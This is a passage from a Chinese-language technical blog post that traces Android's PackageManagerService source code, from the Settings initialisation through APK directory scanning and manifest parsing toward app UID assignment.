class="line"><span class="number">1771</span>    &#125;</span><br></pre></td></tr></table></figure><p><code>PackageManagerService</code>的构造方法是一个六百多行的方法，接下来我们详细分析。</p><p>首先，初始化一些保存各种信息的数据结构，其中比较关键的是<code>Settings</code>对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">mSettings = <span class="keyword">new</span> Settings(mPackages);</span><br><span class="line"><span class="number">1816</span>        mSettings.addSharedUserLPw(<span class="string">"android.uid.system"</span>, Process.SYSTEM_UID,</span><br><span class="line"><span class="number">1817</span>                ApplicationInfo.FLAG_SYSTEM, ApplicationInfo.PRIVATE_FLAG_PRIVILEGED);</span><br><span class="line"><span class="number">1818</span>        mSettings.addSharedUserLPw(<span class="string">"android.uid.phone"</span>, RADIO_UID,</span><br><span class="line"><span class="number">1819</span>                ApplicationInfo.FLAG_SYSTEM, ApplicationInfo.PRIVATE_FLAG_PRIVILEGED);</span><br><span class="line"><span class="number">1820</span>        mSettings.addSharedUserLPw(<span class="string">"android.uid.log"</span>, LOG_UID,</span><br><span class="line"><span class="number">1821</span>                ApplicationInfo.FLAG_SYSTEM, ApplicationInfo.PRIVATE_FLAG_PRIVILEGED);</span><br><span class="line"><span class="number">1822</span>        mSettings.addSharedUserLPw(<span class="string">"android.uid.nfc"</span>, NFC_UID,</span><br><span class="line"><span class="number">1823</span>                ApplicationInfo.FLAG_SYSTEM, ApplicationInfo.PRIVATE_FLAG_PRIVILEGED);</span><br><span class="line"><span class="number">1824</span>        mSettings.addSharedUserLPw(<span class="string">"android.uid.bluetooth"</span>, BLUETOOTH_UID,</span><br><span class="line"><span class="number">1825</span>                ApplicationInfo.FLAG_SYSTEM, ApplicationInfo.PRIVATE_FLAG_PRIVILEGED);</span><br><span class="line"><span class="number">1826</span>        mSettings.addSharedUserLPw(<span class="string">"android.uid.shell"</span>, SHELL_UID,</span><br><span class="line"><span class="number">1827</span>                ApplicationInfo.FLAG_SYSTEM, ApplicationInfo.PRIVATE_FLAG_PRIVILEGED);</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p><a href="http://androidxref.com/8.1.0_r33/xref/frameworks/base/services/core/java/com/android/server/pm/Settings.java" target="_blank" rel="noopener">http://androidxref.com/8.1.0_r33/xref/frameworks/base/services/core/java/com/android/server/pm/Settings.java</a></p><p>Settings对象初始化时创建了一系列文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">428</span>    Settings(File dataDir, Object lock) &#123;</span><br><span class="line"><span class="number">429</span>        mLock = lock;</span><br><span class="line"><span class="number">430</span></span><br><span class="line"><span class="number">431</span>        mRuntimePermissionsPersistence = <span class="keyword">new</span> RuntimePermissionPersistence(mLock);</span><br><span class="line"><span class="number">432</span></span><br><span class="line"><span class="number">433</span>        mSystemDir = <span class="keyword">new</span> File(dataDir, <span class="string">"system"</span>);</span><br><span class="line"><span class="number">434</span>        mSystemDir.mkdirs();</span><br><span class="line"><span class="number">435</span>        FileUtils.setPermissions(mSystemDir.toString(),</span><br><span class="line"><span class="number">436</span>                FileUtils.S_IRWXU|FileUtils.S_IRWXG</span><br><span class="line"><span class="number">437</span>                |FileUtils.S_IROTH|FileUtils.S_IXOTH,</span><br><span class="line"><span class="number">438</span>                -<span class="number">1</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="number">439</span>        mSettingsFilename = <span class="keyword">new</span> File(mSystemDir, <span class="string">"packages.xml"</span>);</span><br><span class="line"><span class="number">440</span>        mBackupSettingsFilename = <span class="keyword">new</span> File(mSystemDir, <span class="string">"packages-backup.xml"</span>);</span><br><span class="line"><span class="number">441</span>        mPackageListFilename = <span class="keyword">new</span> File(mSystemDir, <span class="string">"packages.list"</span>);</span><br><span class="line"><span class="number">442</span>        FileUtils.setPermissions(mPackageListFilename, <span class="number">0640</span>, SYSTEM_UID, PACKAGE_INFO_GID);</span><br><span class="line"><span class="number">443</span></span><br><span class="line"><span class="number">444</span>        <span class="keyword">final</span> File kernelDir = <span class="keyword">new</span> File(<span class="string">"/config/sdcardfs"</span>);</span><br><span class="line"><span class="number">445</span>        mKernelMappingFilename = kernelDir.exists() ? kernelDir : <span class="keyword">null</span>;</span><br><span class="line"><span class="number">446</span></span><br><span class="line"><span class="number">447</span>        <span class="comment">// Deprecated: Needed for migration</span></span><br><span class="line"><span class="number">448</span>        mStoppedPackagesFilename = <span class="keyword">new</span> File(mSystemDir, <span class="string">"packages-stopped.xml"</span>);</span><br><span class="line"><span class="number">449</span>        mBackupStoppedPackagesFilename = <span class="keyword">new</span> File(mSystemDir, <span class="string">"packages-stopped-backup.xml"</span>);</span><br><span class="line"><span class="number">450</span>    &#125;</span><br></pre></td></tr></table></figure><p><code>packages.xml</code>:存放系统中安装的所有应用的包名、前面、缓存目录、权限等信息</p><p><code>packages.list</code>:存放应用包名、uid、安装目录、gid等信息</p><p>接下来在PackageManagerService构造方法中，从SystemConfig中获取了权限配置，以及从SELinuxMMAC读物安装策略等。</p><p>然后，就该扫描系统中的apk文件了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> (mInstallLock) &#123;</span><br><span class="line"><span class="number">1870</span>        <span class="comment">// writer</span></span><br><span class="line"><span class="number">1871</span>        <span class="keyword">synchronized</span> (mPackages) &#123;</span><br><span class="line">    ......</span><br><span class="line">        <span class="comment">// Collect vendor overlay packages.</span></span><br><span class="line"><span class="number">2063</span>            <span class="comment">// (Do this before scanning any apps.)</span></span><br><span class="line"><span class="number">2064</span>            <span class="comment">// For security and version matching reason, only consider</span></span><br><span class="line"><span class="number">2065</span>            <span class="comment">// overlay packages if they reside in VENDOR_OVERLAY_DIR.</span></span><br><span class="line"><span class="number">2066</span>            File vendorOverlayDir = <span class="keyword">new</span> File(VENDOR_OVERLAY_DIR);</span><br><span class="line"><span class="number">2067</span>            scanDirLI(vendorOverlayDir, PackageParser.PARSE_IS_SYSTEM</span><br><span class="line"><span class="number">2068</span>                    | PackageParser.PARSE_IS_SYSTEM_DIR, scanFlags | SCAN_TRUSTED_OVERLAY, <span class="number">0</span>);</span><br><span class="line"><span class="number">2069</span></span><br><span class="line"><span class="number">2070</span>            <span class="comment">// Find base frameworks (resource packages without code).</span></span><br><span class="line"><span class="number">2071</span>            scanDirLI(frameworkDir, PackageParser.PARSE_IS_SYSTEM</span><br><span class="line"><span class="number">2072</span>                    | PackageParser.PARSE_IS_SYSTEM_DIR</span><br><span class="line"><span class="number">2073</span>                    | PackageParser.PARSE_IS_PRIVILEGED,</span><br><span class="line"><span class="number">2074</span>                    scanFlags | SCAN_NO_DEX, <span class="number">0</span>);</span><br><span class="line"><span class="number">2075</span></span><br><span class="line"><span class="number">2076</span>            <span class="comment">// Collected privileged system packages.</span></span><br><span class="line"><span class="number">2077</span>            <span class="keyword">final</span> File privilegedAppDir = <span class="keyword">new</span> File(Environment.getRootDirectory(), <span class="string">"priv-app"</span>);</span><br><span class="line"><span class="number">2078</span>            scanDirLI(privilegedAppDir, PackageParser.PARSE_IS_SYSTEM</span><br><span class="line"><span class="number">2079</span>                    | PackageParser.PARSE_IS_SYSTEM_DIR</span><br><span class="line"><span class="number">2080</span>                    | PackageParser.PARSE_IS_PRIVILEGED, scanFlags, <span class="number">0</span>);</span><br><span class="line"><span class="number">2081</span></span><br><span class="line"><span class="number">2082</span>            <span class="comment">// Collect ordinary system packages.</span></span><br><span class="line"><span class="number">2083</span>            <span class="keyword">final</span> File systemAppDir = <span class="keyword">new</span> File(Environment.getRootDirectory(), <span class="string">"app"</span>);</span><br><span class="line"><span class="number">2084</span>            scanDirLI(systemAppDir, PackageParser.PARSE_IS_SYSTEM</span><br><span class="line"><span class="number">2085</span>                    | PackageParser.PARSE_IS_SYSTEM_DIR, scanFlags, <span class="number">0</span>);</span><br><span class="line"><span class="number">2086</span></span><br><span class="line"><span class="number">2087</span>            <span class="comment">// Collect all vendor packages.</span></span><br><span class="line"><span class="number">2088</span>            File vendorAppDir = <span class="keyword">new</span> File(<span class="string">"/vendor/app"</span>);</span><br><span class="line"><span class="number">2089</span>            <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">2090</span>                vendorAppDir = vendorAppDir.getCanonicalFile();</span><br><span class="line"><span class="number">2091</span>            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line"><span class="number">2092</span>                <span class="comment">// failed to look up canonical path, continue with original one</span></span><br><span class="line"><span class="number">2093</span>            &#125;</span><br><span class="line"><span class="number">2094</span>            scanDirLI(vendorAppDir, PackageParser.PARSE_IS_SYSTEM</span><br><span class="line"><span class="number">2095</span>                    | PackageParser.PARSE_IS_SYSTEM_DIR, scanFlags, <span class="number">0</span>);</span><br><span class="line"><span class="number">2096</span></span><br><span class="line"><span class="number">2097</span>            <span class="comment">// Collect all OEM packages.</span></span><br><span class="line"><span class="number">2098</span>            <span class="keyword">final</span> File oemAppDir = <span class="keyword">new</span> File(Environment.getOemDirectory(), <span class="string">"app"</span>);</span><br><span class="line"><span class="number">2099</span>            scanDirLI(oemAppDir, PackageParser.PARSE_IS_SYSTEM</span><br><span class="line"><span class="number">2100</span>                    | PackageParser.PARSE_IS_SYSTEM_DIR, scanFlags, <span class="number">0</span>);</span><br><span class="line"><span class="number">2101</span></span><br><span class="line"><span class="number">2102</span>            <span class="keyword">if</span> (DEBUG_UPGRADE) Log.v(TAG, <span class="string">"Running installd update commands"</span>);</span><br><span class="line"><span class="number">2103</span>            mInstaller.moveFiles();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入<code>scanDirLI</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5624</span>    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">scanDirLI</span><span class="params">(File dir, <span class="keyword">int</span> parseFlags, <span class="keyword">int</span> scanFlags, <span class="keyword">long</span> currentTime)</span> </span>&#123;</span><br><span class="line"><span class="number">5625</span>        <span class="keyword">final</span> File[] files = dir.listFiles();</span><br><span class="line"><span class="number">5626</span>        <span class="keyword">if</span> (ArrayUtils.isEmpty(files)) &#123;</span><br><span class="line"><span class="number">5627</span>            Log.d(TAG, <span class="string">"No files in app dir "</span> + dir);</span><br><span class="line"><span class="number">5628</span>            <span class="keyword">return</span>;</span><br><span class="line"><span class="number">5629</span>        &#125;</span><br><span class="line"><span class="number">5630</span></span><br><span class="line"><span class="number">5631</span>        <span class="keyword">if</span> (DEBUG_PACKAGE_SCANNING) &#123;</span><br><span class="line"><span class="number">5632</span>            Log.d(TAG, <span class="string">"Scanning app dir "</span> + dir + <span class="string">" scanFlags="</span> + scanFlags</span><br><span class="line"><span class="number">5633</span>                    + <span class="string">" flags=0x"</span> + Integer.toHexString(parseFlags));</span><br><span class="line"><span class="number">5634</span>        &#125;</span><br><span class="line"><span class="number">5635</span></span><br><span class="line"><span class="number">5636</span>        <span class="keyword">for</span> (File file : files) &#123;</span><br><span class="line"><span class="number">5637</span>            <span class="keyword">final</span> <span class="keyword">boolean</span> isPackage = (isApkFile(file) || file.isDirectory())</span><br><span class="line"><span class="number">5638</span>                    &amp;&amp; !PackageInstallerService.isStageName(file.getName());</span><br><span class="line"><span class="number">5639</span>            <span class="keyword">if</span> (!isPackage) &#123;</span><br><span class="line"><span class="number">5640</span>                <span class="comment">// Ignore entries which are not packages</span></span><br><span class="line"><span class="number">5641</span>                <span class="keyword">continue</span>;</span><br><span class="line"><span class="number">5642</span>            &#125;</span><br><span class="line"><span class="number">5643</span>            <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">5644</span>                scanPackageLI(file, parseFlags | PackageParser.PARSE_MUST_BE_APK,</span><br><span class="line"><span class="number">5645</span>                        scanFlags, currentTime, <span class="keyword">null</span>);</span><br><span class="line"><span class="number">5646</span>            &#125; <span class="keyword">catch</span> (PackageManagerException e) &#123;</span><br><span class="line"><span class="number">5647</span>                Slog.w(TAG, <span class="string">"Failed to parse "</span> + file + <span class="string">": "</span> + e.getMessage());</span><br><span class="line"><span class="number">5648</span></span><br><span class="line"><span class="number">5649</span>                <span class="comment">// Delete invalid userdata apps</span></span><br><span class="line"><span class="number">5650</span>                <span class="keyword">if</span> ((parseFlags &amp; PackageParser.PARSE_IS_SYSTEM) == <span class="number">0</span> &amp;&amp;</span><br><span class="line"><span class="number">5651</span>                        e.error == PackageManager.INSTALL_FAILED_INVALID_APK) &#123;</span><br><span class="line"><span class="number">5652</span>                    logCriticalInfo(Log.WARN, <span class="string">"Deleting invalid package at "</span> + file);</span><br><span class="line"><span class="number">5653</span>                    <span class="keyword">if</span> (file.isDirectory()) &#123;</span><br><span class="line"><span class="number">5654</span>                        mInstaller.rmPackageDir(file.getAbsolutePath());</span><br><span class="line"><span class="number">5655</span>                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">5656</span>                        file.delete();</span><br><span class="line"><span class="number">5657</span>                    &#125;</span><br><span class="line"><span class="number">5658</span>                &#125;</span><br><span class="line"><span class="number">5659</span>            &#125;</span><br><span class="line"><span class="number">5660</span>        &#125;</span><br><span class="line"><span class="number">5661</span>    &#125;</span><br></pre></td></tr></table></figure><p>可以看到关键语句为：</p><p><code>scanPackageLI(file, parseFlags | PackageParser.PARSE_MUST_BE_APK,scanFlags, currentTime, null);</code></p><p>浏览并解析一个package:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5735</span>    <span class="keyword">private</span> PackageParser.<span class="function">Package <span class="title">scanPackageLI</span><span class="params">(File scanFile, <span class="keyword">int</span> parseFlags, <span class="keyword">int</span> scanFlags,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="number">5736</span>            <span class="keyword">long</span> currentTime, UserHandle user)</span> <span class="keyword">throws</span> PackageManagerException </span>&#123;</span><br><span class="line">    ......</span><br><span class="line"><span class="number">5739</span>        PackageParser pp = <span class="keyword">new</span> PackageParser();</span><br><span class="line">    ......</span><br><span class="line">        <span class="number">5749</span>        <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">5750</span>            pkg = pp.parsePackage(scanFile, parseFlags);</span><br><span class="line"><span class="number">5751</span>        &#125; <span class="keyword">catch</span> (PackageParserException e) &#123;</span><br><span class="line"><span class="number">5752</span>            <span class="keyword">throw</span> PackageManagerException.from(e);</span><br><span class="line"><span class="number">5753</span>        &#125;</span><br><span class="line">    ......</span><br><span class="line"><span class="number">5931</span>        <span class="comment">// Set application objects path explicitly.</span></span><br><span class="line"><span class="number">5932</span>        pkg.applicationInfo.volumeUuid = pkg.volumeUuid;</span><br><span class="line"><span class="number">5933</span>        pkg.applicationInfo.setCodePath(pkg.codePath);</span><br><span class="line"><span class="number">5934</span>        pkg.applicationInfo.setBaseCodePath(pkg.baseCodePath);</span><br><span class="line"><span class="number">5935</span>        pkg.applicationInfo.setSplitCodePaths(pkg.splitCodePaths);</span><br><span class="line"><span class="number">5936</span>        pkg.applicationInfo.setResourcePath(resourcePath);</span><br><span class="line"><span class="number">5937</span>        pkg.applicationInfo.setBaseResourcePath(baseResourcePath);</span><br><span class="line"><span class="number">5938</span>        pkg.applicationInfo.setSplitResourcePaths(pkg.splitCodePaths);</span><br><span class="line"><span class="number">5939</span></span><br><span class="line"><span class="number">5941</span>        PackageParser.Package scannedPkg = scanPackageLI(pkg, parseFlags, scanFlags</span><br><span class="line"><span class="number">5942</span>                | SCAN_UPDATE_SIGNATURE, currentTime, user);</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是解析APK包，进入<code>PackageParser.parsePackage()</code>:</p><p><a href="http://androidxref.com/6.0.1_r10/xref/frameworks/base/core/java/android/content/pm/PackageParser.java" target="_blank" rel="noopener">http://androidxref.com/6.0.1_r10/xref/frameworks/base/core/java/android/content/pm/PackageParser.java</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">752</span>    <span class="function"><span class="keyword">public</span> Package <span class="title">parsePackage</span><span class="params">(File packageFile, <span class="keyword">int</span> flags)</span> <span class="keyword">throws</span> PackageParserException </span>&#123;</span><br><span class="line"><span class="number">753</span>        <span class="keyword">if</span> (packageFile.isDirectory()) &#123;</span><br><span class="line"><span class="number">754</span>            <span class="keyword">return</span> parseClusterPackage(packageFile, flags);</span><br><span class="line"><span class="number">755</span>        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">756</span>            <span class="keyword">return</span> parseMonolithicPackage(packageFile, flags);</span><br><span class="line"><span class="number">757</span>        &#125;</span><br><span class="line"><span class="number">758</span>    &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">826</span>    <span class="meta">@Deprecated</span></span><br><span class="line"><span class="number">827</span>    <span class="function"><span class="keyword">public</span> Package <span class="title">parseMonolithicPackage</span><span class="params">(File apkFile, <span class="keyword">int</span> flags)</span> <span class="keyword">throws</span> PackageParserException </span>&#123;</span><br><span class="line"><span class="number">828</span>      ......</span><br><span class="line"><span class="number">836</span>        <span class="keyword">final</span> AssetManager assets = <span class="keyword">new</span> AssetManager();</span><br><span class="line"><span class="number">837</span>        <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">838</span>            <span class="keyword">final</span> Package pkg = parseBaseApk(apkFile, assets, flags);</span><br><span class="line"><span class="number">839</span>            pkg.codePath = apkFile.getAbsolutePath();</span><br><span class="line"><span class="number">840</span>            <span class="keyword">return</span> pkg;</span><br><span class="line"><span class="number">841</span>        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"><span class="number">842</span>            IoUtils.closeQuietly(assets);</span><br><span class="line"><span class="number">843</span>        &#125;</span><br><span class="line"><span class="number">844</span>    &#125;</span><br></pre></td></tr></table></figure><p>进入<code>parseBaseApk</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">879</span>        <span class="keyword">final</span> <span class="keyword">int</span> cookie = loadApkIntoAssetManager(assets, apkPath, flags);</span><br><span class="line"><span class="number">880</span></span><br><span class="line"><span class="number">881</span>        Resources res = <span class="keyword">null</span>;</span><br><span class="line"><span class="number">882</span>        XmlResourceParser parser = <span class="keyword">null</span>;</span><br><span class="line"><span class="number">883</span>        <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">884</span>            res = <span class="keyword">new</span> Resources(assets, mMetrics, <span class="keyword">null</span>);</span><br><span class="line"><span class="number">885</span>            assets.setConfiguration(<span class="number">0</span>, <span class="number">0</span>, <span class="keyword">null</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"><span class="number">886</span>                    Build.VERSION.RESOURCES_SDK_INT);</span><br><span class="line"><span class="number">887</span>            parser = assets.openXmlResourceParser(cookie, ANDROID_MANIFEST_FILENAME);</span><br><span class="line"><span class="number">888</span></span><br><span class="line"><span class="number">889</span>            <span class="keyword">final</span> String[] outError = <span class="keyword">new</span> String[<span class="number">1</span>];</span><br><span class="line"><span class="number">890</span>            <span class="keyword">final</span> Package pkg = parseBaseApk(res, parser, flags, outError);</span><br><span class="line"><span class="number">891</span>            <span class="keyword">if</span> (pkg == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="number">892</span>                <span class="keyword">throw</span> <span class="keyword">new</span> PackageParserException(mParseError,</span><br><span class="line"><span class="number">893</span>                        apkPath + <span class="string">" (at "</span> + parser.getPositionDescription() + <span class="string">"): "</span> + outError[<span class="number">0</span>]);</span><br><span class="line"><span class="number">894</span>            &#125;</span><br><span class="line"><span class="number">895</span></span><br><span class="line"><span class="number">896</span>            pkg.volumeUuid = volumeUuid;</span><br><span class="line"><span class="number">897</span>            pkg.applicationInfo.volumeUuid = volumeUuid;</span><br><span class="line"><span class="number">898</span>            pkg.baseCodePath = apkPath;</span><br><span class="line"><span class="number">899</span>            pkg.mSignatures = <span class="keyword">null</span>;</span><br><span class="line"><span class="number">900</span></span><br><span class="line"><span class="number">901</span>            <span class="keyword">return</span> pkg;</span><br></pre></td></tr></table></figure><p>可以看到又调用了一个<code>parseBaseApk</code>方法，但是参数变了，功能是解析Manifest:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1348</span>    <span class="comment">/**</span></span><br><span class="line"><span class="comment">1349     * Parse the manifest of a &lt;em&gt;base APK&lt;/em&gt;.</span></span><br><span class="line"><span class="comment">1350     * &lt;p&gt;</span></span><br><span class="line"><span class="comment">1351     * When adding new features, carefully consider if they should also be</span></span><br><span class="line"><span class="comment">1352     * supported by split APKs.</span></span><br><span class="line"><span class="comment">1353     */</span></span><br><span class="line"><span class="number">1354</span>    <span class="function"><span class="keyword">private</span> Package <span class="title">parseBaseApk</span><span class="params">(Resources res, XmlResourceParser parser, <span class="keyword">int</span> flags,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="number">1355</span>            String[] outError)</span> <span class="keyword">throws</span> XmlPullParserException, IOException </span>&#123;</span><br><span class="line">......</span><br><span class="line"><span class="number">1358</span>        AttributeSet attrs = parser;</span><br><span class="line">    ......</span><br><span class="line">        Pair&lt;String, String&gt; packageSplit = parsePackageSplitNames(parser, attrs, flags);</span><br><span class="line"><span class="number">1369</span>            pkgName = packageSplit.first;</span><br><span class="line"><span class="number">1370</span>            splitName = packageSplit.second;</span><br><span class="line">    ......</span><br><span class="line">        <span class="keyword">while</span> ((type = parser.next()) != XmlPullParser.END_DOCUMENT</span><br><span class="line"><span class="number">1442</span>                &amp;&amp; (type != XmlPullParser.END_TAG || parser.getDepth() &gt; outerDepth)) &#123;</span><br><span class="line">            .......</span><br><span class="line">                <span class="keyword">if</span> (tagName.equals(<span class="string">"application"</span>)) &#123;</span><br><span class="line">                    ......</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (tagName.equals(<span class="string">"overlay"</span>)) &#123;</span><br><span class="line">                    ......</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span> (tagName.equals(<span class="string">"permission-group"</span>)) &#123;</span><br><span class="line">                    ......</span><br><span class="line">                &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解析完apk包，调用了<code>PackageParser.Package scannedPkg = scanPackageLI(pkg, parseFlags, scanFlags | SCAN_UPDATE_SIGNATURE, currentTime, user);</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">6466</span>    <span class="keyword">private</span> PackageParser.<span class="function">Package <span class="title">scanPackageLI</span><span class="params">(PackageParser.Package pkg, <span class="keyword">int</span> parseFlags,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="number">6467</span>            <span class="keyword">int</span> scanFlags, <span class="keyword">long</span> currentTime, UserHandle user)</span> <span class="keyword">throws</span> PackageManagerException </span>&#123;</span><br><span class="line"><span class="number">6468</span>        <span class="keyword">boolean</span> success = <span class="keyword">false</span>;</span><br><span class="line"><span class="number">6469</span>        <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">6470</span>            <span class="keyword">final</span> PackageParser.Package res = scanPackageDirtyLI(pkg, parseFlags, scanFlags,</span><br><span class="line"><span class="number">6471</span>                    currentTime, user);</span><br><span class="line"><span class="number">6472</span>            success = <span class="keyword">true</span>;</span><br><span class="line"><span class="number">6473</span>            <span class="keyword">return</span> res;</span><br><span class="line"><span class="number">6474</span>        &#125;</span><br><span class="line">    ......</span><br><span class="line"><span class="number">6479</span>    &#125;</span><br></pre></td></tr></table></figure><p>进入<code>scanPackageDirtyLI</code>,给app分配uid过程就在其中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">6481</span>    <span class="keyword">private</span> PackageParser.<span class="function">Package <span class="title">scanPackageDirtyLI</span><span class="params">(PackageParser.Package pkg, <span class="keyword">int</span> parseFlags,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="number">6482</span>            <span class="keyword">int</span> scanFlags, <span class="keyword">long</span> currentTime, UserHandle 